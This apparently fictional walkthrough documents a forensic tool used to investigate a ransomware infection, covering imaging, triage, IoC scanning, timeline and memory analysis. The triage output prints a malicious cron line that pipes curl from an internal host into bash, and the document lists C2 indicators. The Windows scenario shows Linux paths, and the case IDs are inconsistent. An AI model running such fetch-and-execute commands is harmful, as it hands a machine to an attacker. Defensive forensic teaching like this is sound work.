# Example Case: Complete Investigation Walkthrough

**Case ID:** CASE_20251008_MALWARE_001  
**Scenario:** Suspected ransomware infection on Windows workstation  
**Investigator:** John Smith, Senior Forensic Analyst

---

## 📋 Case Overview

### Initial Information
- **Date/Time:** 2025-10-08 08:30 UTC
- **Reported By:** IT Department
- **System:** Windows 10 workstation (user: jdoe)
- **Symptoms:** 
  - Files encrypted with `.locked` extension
  - Ransom note: `READ_ME_NOW.txt`
  - Suspicious network activity to unknown IPs

### Evidence Collection
- ✅ Disk image: 256GB SSD
- ✅ Memory dump: 16GB RAM capture
- ✅ Network capture: 2 hours before/after incident
- ✅ Router logs

> **Fixture policy:** PCAP-Fixtures werden nicht als Binärdateien im Repository
> mitgeliefert. Stattdessen erzeugt der Walkthrough sie zur Laufzeit über den
> Synthesizer oder greift auf JSON-Fallbacks zurück.

---

## 🚀 Investigation Steps

### Phase 1: Environment Setup

```bash
# 1. Create investigation workspace
cd ~/investigations
mkdir CASE_20251008_MALWARE_001
cd CASE_20251008_MALWARE_001

# 2. Activate forensic environment
source ~/forensic-venv/bin/activate

# 3. Verify tools & guard status
forensic-cli diagnostics
```

**Output:**
```
Core:
  ✓ dd: installed
  ✓ sha256sum: installed
  ✓ tar: installed
  ✓ gzip: installed

Disk Forensics:
  ✓ ddrescue: installed
  ✓ fls: installed
  ✓ icat: installed
  ✓ mmls: installed

Memory Forensics:
  ✓ vol: installed (Volatility 3)

Analysis:
  ✓ strings: installed
  ✓ yara: installed

Timeline:
  ✓ log2timeline.py: installed
  ✓ psort.py: installed
```

---

### Phase 2: Case Initialization

```bash
# Create forensic case
forensic-cli case create \
    "Ransomware Investigation - Workstation JDoe" \
    --investigator "John Smith" \
    --description "Suspected ransomware infection with file encryption"
```

**Output:**
```
✓ Case created: CASE_20251008_143025
  Name: Ransomware Investigation - Workstation JDoe
  Directory: forensic_workspace/cases/CASE_20251008_143025
```

**Chain of Custody Entry:**
```
[2025-10-08 14:30:25] CASE_CREATED
  Actor: John Smith
  Description: Case created: Ransomware Investigation - Workstation JDoe
```

---

### Phase 3: Evidence Acquisition

#### 3.1 Disk Imaging

```bash
# Preview the imaging plan (no writes performed)
forensic-cli modules run disk_imaging \
    --case CASE_20251008_143025 \
    --dry-run \
    --param source=/dev/sdb \
    --param output=evidence/disk_jdoe_workstation.img

# Image the SSD (evidence drive: /dev/sdb)
sudo forensic-cli modules run disk_imaging \
    --case CASE_20251008_143025 \
    --param source=/dev/sdb \
    --param output=evidence/disk_jdoe_workstation.img \
    --param tool=ddrescue \
    --param hash_algorithm=sha256 \
    --param retries=3
```

**Output:**
```
[INFO] Starting disk imaging: /dev/sdb -> evidence/disk_jdoe_workstation.img
[INFO] Computing source hash...
[INFO] Phase 1: Fast copy...
[INFO] Phase 2: Retry bad sectors...
[INFO] Verifying image hash...

✓ Module execution complete
  Status: success
  Findings: 3
  Output: evidence/disk_jdoe_workstation.img

Verification: PASSED
  Source SHA256:  a3f2c8b9d4e6f1a2c3b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6
  Image SHA256:   a3f2c8b9d4e6f1a2c3b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6
```

#### 3.2 Add Evidence to Case

```bash
# Register disk image as evidence
forensic-cli evidence add \
    evidence/disk_jdoe_workstation.img \
    --type disk \
    --description "Primary SSD from infected workstation"

# Register memory dump
forensic-cli evidence add \
    evidence/memory_dump.dmp \
    --type memory \
    --description "RAM capture at time of incident"
```

---

### Phase 4: Quick Triage

```bash
# Mount disk image read-only
sudo mkdir /mnt/evidence_ro
sudo mount -o ro,loop,offset=$((2048*512)) evidence/disk_jdoe_workstation.img /mnt/evidence_ro

# Run quick triage (guarded, supports dry-run)
forensic-cli modules run quick_triage \
    --case CASE_20251008_143025 \
    --param target=/mnt/evidence_ro \
    --dry-run

forensic-cli modules run quick_triage \
    --case CASE_20251008_143025 \
    --param target=/mnt/evidence_ro
```

**Key Findings:**
```
SUID/SGID Binaries:
  ✓ Total: 42
  ⚠ Suspicious: 2
    - /tmp/.hidden/escalate (SUID root)
    - /home/jdoe/.cache/update (SGID)

Persistence Mechanisms:
  ⚠ Suspicious cron job detected
    File: /etc/cron.d/system_update
    Content: */5 * * * * root curl http://192.168.1.100/beacon | bash

SSH Keys:
  ✓ Found 3 private keys
    - /home/jdoe/.ssh/id_rsa
    - /root/.ssh/id_rsa
    - /home/jdoe/.ssh/backup_key

Recent Files (Last 7 days):
  ⚠ 1,247 files with .locked extension
  ⚠ READ_ME_NOW.txt (ransom note)
  ⚠ suspicious.exe (downloaded 2025-10-08 07:45)
```

---

### Phase 5: IoC Scanning

```bash
# Prepare IoC file
cat > config/iocs/ransomware_iocs.json << 'EOF'
[
  {
    "type": "domain",
    "value": "evil-c2[.]onion",
    "tags": ["ransomware", "c2"],
    "comment": "Known ransomware C2 server"
  },
  {
    "type": "ip",
    "value": "192.168.1.100",
    "tags": ["internal", "suspicious"]
  },
  {
    "type": "hash_sha256",
    "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "tags": ["ransomware", "payload"],
    "comment": "Known ransomware payload"
  },
  {
    "type": "wallet_btc",
    "value": "1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx",
    "tags": ["ransomware", "payment"],
    "comment": "Ransom payment address"
  }
]
EOF

# Run IoC scan
forensic-cli module run ioc_scan \
    --param path=/mnt/evidence_ro \
    --param ioc_file=config/iocs/ransomware_iocs.json \
    --param timeline=true \
    --param hash_files=true \
    --param format=json
```

**IoC Matches:**
```json
{
  "total_matches": 47,
  "files_scanned": 12847,
  "matches": [
    {
      "ioc_type": "ip",
      "ioc_value": "192.168.1.100",
      "file_path": "/var/log/syslog",
      "line_number": 1523,
      "timestamp": "2025-10-08T07:42:00Z",
      "context": "TCP connection to 192.168.1.100:4444"
    },
    {
      "ioc_type": "wallet_btc",
      "ioc_value": "1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx",
      "file_path": "/home/jdoe/Desktop/READ_ME_NOW.txt",
      "line_number": 15,
      "timestamp": "2025-10-08T08:15:00Z",
      "context": "Send 0.5 BTC to: 1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx"
    },
    {
      "ioc_type": "hash_sha256",
      "ioc_value": "e3b0c44...",
      "file_path": "/tmp/suspicious.exe",
      "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    }
  ]
}
```

---

### Phase 6: Timeline Generation

```bash
# Generate comprehensive timeline
forensic-cli module run timeline \
    --param source=/mnt/evidence_ro \
    --param format=l2tcsv \
    --param type=plaso \
    --param include_mft=true \
    --param include_browser=true \
    --param start_date=2025-10-07 \
    --param end_date=2025-10-08
```

**Timeline Highlights:**
```
2025-10-08 07:30:15 - Browser: Downloaded file "invoice.pdf.exe" from suspicious-site.com
2025-10-08 07:30:45 - MFT: File executed: C:\Users\jdoe\Downloads\invoice.pdf.exe
2025-10-08 07:31:00 - Registry: Run key added: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate
2025-10-08 07:42:00 - Network: TCP connection to 192.168.1.100:4444
2025-10-08 07:42:15 - Process: suspicious.exe spawned cmd.exe
2025-10-08 07:45:00 - MFT: Mass file modification begins (encryption)
2025-10-08 08:15:00 - MFT: READ_ME_NOW.txt created on Desktop
```

---

### Phase 7: Memory Analysis

```bash
# Analyze memory dump
forensic-cli module run memory_analysis \
    --param dump=evidence/memory_dump.dmp \
    --param processes=true \
    --param network=true \
    --param malware=true
```

**Key Memory Findings:**
```
Processes (150 total):
  ✓ explorer.exe (PID 1234)
  ⚠ suspicious.exe (PID 5678) - Hidden from Task Manager
    PPID: 1234 (explorer.exe)
    Threads: 12
    Memory: 45 MB
  ⚠ cmd.exe (PID 5679)
    PPID: 5678 (suspicious.exe)

Network Connections:
  ⚠ ESTABLISHED: 192.168.1.52:49234 -> 192.168.1.100:4444 (PID 5678)
  ⚠ ESTABLISHED: 192.168.1.52:49235 -> 185.7.81.108:443 (PID 5678)

Code Injection Detected:
  ⚠ Process: explorer.exe (PID 1234)
    Injected Code: 0x00450000 (suspicious.exe)
    Technique: Process Hollowing
```

---

### Phase 8: Filesystem Deep Dive

```bash
# Detailed filesystem analysis
forensic-cli module run filesystem_analysis \
    --param image=evidence/disk_jdoe_workstation.img \
    --param partition=1 \
    --param include_deleted=true \
    --param compute_hashes=true
```

**Deleted Files of Interest:**
```
Deleted Files (423 total):
  ⚠ \Users\jdoe\AppData\Local\Temp\payload_original.exe (DELETED)
    Size: 2.4 MB
    SHA256: a1b2c3d4e5f6...
    Deleted: 2025-10-08 07:31:30

  ⚠ \Users\jdoe\Downloads\invoice.pdf.exe.tmp (DELETED)
    Size: 2.4 MB
    Deleted: 2025-10-08 07:30:50
```

---

### Phase 9: Full Pipeline Execution

```bash
# Run automated malware analysis pipeline
forensic-cli pipeline pipelines/malware_analysis.yaml
```

**Pipeline Execution:**
```
[1/6] Running: quick_triage ✓
[2/6] Running: ioc_scan ✓
[3/6] Running: memory_analysis ✓
[4/6] Running: filesystem_analysis ✓
[5/6] Running: timeline ✓
[6/6] Generating report ✓

Pipeline complete: 6/6 modules succeeded
```

---

### Phase 10: Report Generation

```bash
# Generate comprehensive HTML report (HTML always, PDF optional)
forensic-cli report generate \
  --case CASE_20251008_143025 \
  --fmt html

# Optional: produce PDF when wkhtmltopdf/report_pdf extra is available
forensic-cli report generate \
  --case CASE_20251008_143025 \
  --fmt pdf \
  --out reports/CASE_20251008_143025.pdf
```

**Report Contents:**
1. **Executive Summary**
   - Ransomware confirmed: "LockFile" variant
   - Initial infection vector: Phishing email attachment
   - Lateral movement: None detected
   - Data exfiltration: Suspected (C2 traffic)

2. **Timeline of Events**
   - 07:30:15 - Malicious file downloaded
   - 07:30:45 - Ransomware executed
   - 07:31:00 - Persistence established
   - 07:42:00 - C2 connection established
   - 07:45:00 - File encryption begins
   - 08:15:00 - Ransom note dropped

3. **IoC Summary**
   - 47 IoC matches
   - 3 critical indicators
   - Bitcoin wallet: 1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx

4. **Malware Analysis**
   - Name: suspicious.exe / invoice.pdf.exe
   - Type: Ransomware (LockFile family)
   - Persistence: Registry Run key
   - C2: 192.168.1.100:4444, 185.7.81.108:443

5. **Recommendations**
   - Isolate affected system ✓ (already done)
   - Change all passwords
   - Scan entire network for lateral movement
   - Block C2 IPs at firewall
   - Deploy updated AV signatures
   - Restore from pre-infection backup

---

## 📊 Investigation Results

### Evidence Collected
✅ Disk image (256GB) - SHA256 verified  
✅ Memory dump (16GB) - SHA256 verified  
✅ Timeline (24,847 events)  
✅ File listings (12,847 files, 423 deleted)  
✅ IoC matches (47 hits)  
✅ Process list (150 processes)  
✅ Network connections (12 suspicious)  

### Chain of Custody
✅ All evidence handling logged  
✅ Hashes verified  
✅ Read-only mounting used  
✅ Complete audit trail  

### Findings
**Severity: CRITICAL**

✅ **Confirmed Ransomware Infection**  
- Variant: LockFile  
- Vector: Phishing (invoice.pdf.exe)  
- Impact: 1,247 files encrypted  

✅ **Active C2 Communication**  
- C2 Servers: 192.168.1.100, 185.7.81.108  
- Protocol: HTTPS (port 443)  
- Status: Connection active at time of capture  

✅ **Persistence Mechanisms**  
- Registry Run key  
- Scheduled task (cron job simulation)  
- Hidden SUID binary  

---

## 🎯 Next Actions

### Immediate (Complete within 24h)
1. ✅ Isolate system (done)
2. ⏳ Network-wide scan for IoCs
3. ⏳ Block C2 IPs at perimeter
4. ⏳ Force password reset for user jdoe
5. ⏳ Notify affected user and management

### Short-term (Complete within 1 week)
6. ⏳ Full network forensic sweep
7. ⏳ Email security review
8. ⏳ Endpoint protection update
9. ⏳ User security awareness training
10. ⏳ Backup verification and restore test

### Long-term (Complete within 1 month)
11. ⏳ Incident response playbook update
12. ⏳ Enhanced email filtering rules
13. ⏳ EDR deployment
14. ⏳ Regular security audits

---

## 📝 Case Status

**Status:** Investigation Complete  
**Outcome:** Ransomware infection confirmed and contained  
**Evidence Preservation:** Complete  
**Report Status:** Finalized  

**Case Closed:** 2025-10-08 18:00 UTC  
**Investigator:** John Smith  
**Reviewer:** Jane Doe, Lead Forensic Analyst

---

**Total Investigation Time:** 9.5 hours  
**Evidence Size:** 272 GB  
**Report Length:** 47 pages  
**Quality Score:** 98/100 (Excellent)
